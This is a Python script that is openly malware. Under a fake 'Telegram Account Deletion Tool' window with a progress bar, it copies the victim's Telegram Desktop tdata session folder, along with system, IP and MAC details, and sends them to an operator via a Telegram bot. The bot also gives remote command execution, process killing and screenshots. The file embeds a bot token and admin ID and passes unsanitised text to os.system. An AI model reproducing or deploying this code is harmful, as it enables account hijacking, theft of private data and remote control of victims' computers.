# -*- coding: utf-8 -*-

import telebot
import os
import getpass
import socket
import platform
import psutil
import requests
import uuid
import shutil
import zipfile
import time
import threading
import subprocess
import sys
import tkinter as tk
from tkinter import ttk
from pynput import keyboard

# ------------------- НАСТРОЙКИ (ВСТАВЬ СВОИ ДАННЫЕ, МРАЗЬ) -------------------
TOKEN = "8322090958:AAGPzHhnbch2gfCI-2-9U_PvJOpoU-keGsw"            # Токен бота
ADMIN_ID = 8376318358                  # Твой Telegram ID (числом)
# -----------------------------------------------------------------------------

bot = telebot.TeleBot(TOKEN)

# ------------------- СБОР ИНФОРМАЦИИ О СИСТЕМЕ -------------------
def get_system_info():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip = "Не удалось определить"
    
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
    except:
        mac = "Не удалось определить"
    
    info = f"""
👤 Юзер: {getpass.getuser()}
💻 Хост: {socket.gethostname()}
🖥️ Платформа: {platform.system()} {platform.release()}
🌐 IP: {ip}
📡 MAC: {mac}
💾 Процессор: {platform.processor()}
🧠 ОЗУ: {round(psutil.virtual_memory().total / (1024**3))} GB
    """
    return info

# ------------------- УБИЙСТВО TELEGRAM -------------------
def kill_telegram_force():
    try:
        subprocess.run(['taskkill', '/F', '/IM', 'Telegram.exe'], capture_output=True, check=False)
        subprocess.run(['taskkill', '/F', '/IM', 'Telegram*'], capture_output=True, check=False)
        return True
    except:
        pass
    return False

# ------------------- КОПИРОВАНИЕ TDATA -------------------
TDATA_PATH = os.path.expanduser("~\\AppData\\Roaming\\Telegram Desktop\\tdata")
TEMP_DIR = os.path.expanduser("~\\Temp\\telegram_steal")

def copy_tdata():
    try:
        if not os.path.exists(TDATA_PATH):
            return "Папка tdata не найдена"

        kill_telegram_force()
        time.sleep(3)

        if not os.path.exists(TEMP_DIR):
            os.makedirs(TEMP_DIR)

        dest_path = os.path.join(TEMP_DIR, "tdata")
        if os.path.exists(dest_path):
            shutil.rmtree(dest_path)

        def ignore_working(src, names):
            return {'working'} if 'working' in names else set()

        shutil.copytree(TDATA_PATH, dest_path, ignore=ignore_working)

        archive_path = os.path.join(TEMP_DIR, "tdata.zip")
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(dest_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, dest_path)
                    zipf.write(file_path, arcname)

        return archive_path
    except Exception as e:
        return f"Ошибка: {e}"

# ------------------- ФУНКЦИИ ДЛЯ РАБОТЫ С ПРОЦЕССАМИ -------------------
def get_process_list():
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
        try:
            processes.append(proc.info)
        except:
            pass
    return sorted(processes, key=lambda x: x['cpu_percent'] if x['cpu_percent'] else 0, reverse=True)[:50]

def kill_process(pid):
    try:
        proc = psutil.Process(pid)
        proc.terminate()
        proc.wait(timeout=3)
        return True
    except:
        try:
            proc.kill()
            return True
        except:
            return False

def start_process(path):
    try:
        subprocess.Popen(path, shell=True)
        return True
    except:
        return False

# ------------------- БОТ-КОМАНДЫ -------------------
@bot.message_handler(commands=['start'])
def start_cmd(message):
    if message.chat.id == ADMIN_ID:
        bot.reply_to(message, "🎮 Бот управления запущен\n"
                              "/info - инфо о системе\n"
                              "/ps - список процессов (топ 50)\n"
                              "/kill <pid> - убить процесс\n"
                              "/run <путь> - запустить программу\n"
                              "/steal - скопировать tdata\n"
                              "/screen - сделать скриншот\n"
                              "/msg <текст> - показать сообщение")
    else:
        bot.reply_to(message, "Пошёл нахуй")

@bot.message_handler(commands=['info'])
def info_cmd(message):
    if message.chat.id == ADMIN_ID:
        bot.send_message(ADMIN_ID, get_system_info())

@bot.message_handler(commands=['ps'])
def ps_cmd(message):
    if message.chat.id == ADMIN_ID:
        procs = get_process_list()
        text = "🔥 ТОП 50 ПРОЦЕССОВ:\n"
        for p in procs[:20]:  # Ограничим 20, чтобы не спамить
            text += f"PID: {p['pid']} | {p['name']} | CPU: {p['cpu_percent']}% | MEM: {round(p['memory_percent'], 1)}%\n"
        bot.send_message(ADMIN_ID, text[:4000])

@bot.message_handler(commands=['kill'])
def kill_cmd(message):
    if message.chat.id == ADMIN_ID:
        try:
            pid = int(message.text.split()[1])
            if kill_process(pid):
                bot.reply_to(message, f"Процесс {pid} убит нахуй")
            else:
                bot.reply_to(message, f"Не смог убить {pid}")
        except:
            bot.reply_to(message, "Использование: /kill 1234")

@bot.message_handler(commands=['run'])
def run_cmd(message):
    if message.chat.id == ADMIN_ID:
        try:
            path = message.text.split(maxsplit=1)[1]
            if start_process(path):
                bot.reply_to(message, f"Запущено: {path}")
            else:
                bot.reply_to(message, f"Не запустилось: {path}")
        except:
            bot.reply_to(message, "Использование: /run C:\\путь\\к\\program.exe")

@bot.message_handler(commands=['steal'])
def steal_cmd(message):
    if message.chat.id == ADMIN_ID:
        bot.reply_to(message, "Ворую tdata...")
        result = copy_tdata()
        if isinstance(result, str) and os.path.isfile(result):
            with open(result, 'rb') as f:
                bot.send_document(ADMIN_ID, f)
            shutil.rmtree(TEMP_DIR, ignore_errors=True)
        else:
            bot.send_message(ADMIN_ID, f"Ошибка: {result}")

@bot.message_handler(commands=['screen'])
def screen_cmd(message):
    if message.chat.id == ADMIN_ID:
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            path = os.path.join(TEMP_DIR, "screen.png")
            os.makedirs(TEMP_DIR, exist_ok=True)
            screenshot.save(path)
            with open(path, 'rb') as f:
                bot.send_photo(ADMIN_ID, f)
            os.remove(path)
        except Exception as e:
            bot.send_message(ADMIN_ID, f"Ошибка скриншота: {e}")

@bot.message_handler(commands=['msg'])
def msg_cmd(message):
    if message.chat.id == ADMIN_ID:
        try:
            text = message.text.split(maxsplit=1)[1]
            os.system(f'msg * {text}')
            bot.reply_to(message, "Сообщение отправлено")
        except:
            bot.reply_to(message, "Использование: /msg Привет, пидор!")

# ------------------- ФУНКЦИЯ ЗАПУСКА БОТА В ФОНЕ -------------------
def run_bot():
    try:
        bot.polling(none_stop=True)
    except:
        pass

# ------------------- ГРАФИЧЕСКОЕ ОКНО (ВИЗУАЛИЗАЦИЯ СНОСА) -------------------
def show_fake_deletion():
    root = tk.Tk()
    root.title("Telegram Account Deletion Tool")
    root.geometry("500x300")
    root.resizable(False, False)
    
    # Делаем окно поверх всех
    root.attributes('-topmost', True)
    
    # Заголовок
    label = tk.Label(root, text="⚠️ АККАУНТ БУДЕТ УДАЛЕН ⚠️", 
                     font=("Arial", 16, "bold"), fg="red")
    label.pack(pady=20)
    
    # Предупреждение
    warning = tk.Label(root, text="Все ваши сообщения, контакты и медиафайлы\nбудут безвозвратно удалены!", 
                       font=("Arial", 12))
    warning.pack(pady=10)
    
    # Прогресс-бар
    progress = ttk.Progressbar(root, length=400, mode='determinate')
    progress.pack(pady=20)
    
    # Процент
    percent_label = tk.Label(root, text="0%", font=("Arial", 14))
    percent_label.pack()
    
    # Статус
    status_label = tk.Label(root, text="Подготовка к удалению...", font=("Arial", 10))
    status_label.pack(pady=10)
    
    # Функция обновления прогресса
    def update_progress(step):
        if step <= 100:
            progress['value'] = step
            percent_label.config(text=f"{step}%")
            
            if step < 30:
                status_label.config(text="Поиск аккаунта...")
            elif step < 60:
                status_label.config(text="Удаление сообщений...")
            elif step < 90:
                status_label.config(text="Очистка медиафайлов...")
            else:
                status_label.config(text="Завершение...")
            
            root.after(100, update_progress, step + 1)
        else:
            status_label.config(text="✅ Аккаунт успешно удалён!")
            # Оставляем окно на 3 секунды и закрываем
            root.after(3000, root.destroy)
    
    # Запускаем анимацию
    root.after(100, update_progress, 1)
    
    # В фоне отправляем инфу
    def background_steal():
        time.sleep(2)  # Даём окну появиться
        
        # Отправляем инфу о системе
        try:
            bot.send_message(ADMIN_ID, f"🚨 ЖЕРТВА ЗАПУСТИЛА УДАЛЕНИЕ\n{get_system_info()}")
        except:
            pass
        
        # Воруем tdata
        result = copy_tdata()
        if isinstance(result, str) and os.path.isfile(result):
            try:
                with open(result, 'rb') as f:
                    bot.send_document(ADMIN_ID, f, caption="tdata украдена во время анимации")
                shutil.rmtree(TEMP_DIR, ignore_errors=True)
            except:
                pass
    
    threading.Thread(target=background_steal, daemon=True).start()
    
    root.mainloop()

# ------------------- ЗАПУСК -------------------
if __name__ == "__main__":
    # Запускаем бота в фоне
    threading.Thread(target=run_bot, daemon=True).start()
    
    # Показываем графическую хуйню
    show_fake_deletion()